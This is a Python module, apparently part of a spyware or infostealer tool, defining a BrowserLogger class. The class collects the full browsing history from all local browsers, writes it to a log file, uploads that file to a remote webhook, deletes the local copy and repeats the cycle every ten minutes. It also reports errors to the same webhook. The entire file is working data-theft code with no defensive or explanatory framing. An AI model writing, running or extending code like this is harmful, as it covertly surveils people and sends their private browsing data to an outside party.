from main import SOFTWARE_DIR_NAME, WEBHOOK_URL
from utils import *

import browserhistory as bh
import time

class BrowserLogger:
    def __init__(self):
        self.log_file = os.path.join(get_logs_path(SOFTWARE_DIR_NAME), "browser_logs.txt")
        self.interval = 600
        
    def log_browser(self):
        if not os.path.exists(self.log_file):
            with open(self.log_file, "w") as f:
                f.write("Browser History:\n\n")
        try:
            browser_history = bh.get_browserhistory()
            if browser_history:
                for browser, history in browser_history.items():
                    for search in history:
                        with open(self.log_file, "a") as f:
                            f.write(f"{search[2]}: {search[1]} ({search[0]})\n")
            send_webhook(WEBHOOK_URL, file={"browser_logs.txt": open(self.log_file, "rb")})
            os.remove(self.log_file)
        except Exception or UnboundLocalError as e:
            send_webhook(WEBHOOK_URL, f"Error logging browser history: {e}")        

    def start(self):
        while True:
            self.log_browser()
            time.sleep(self.interval)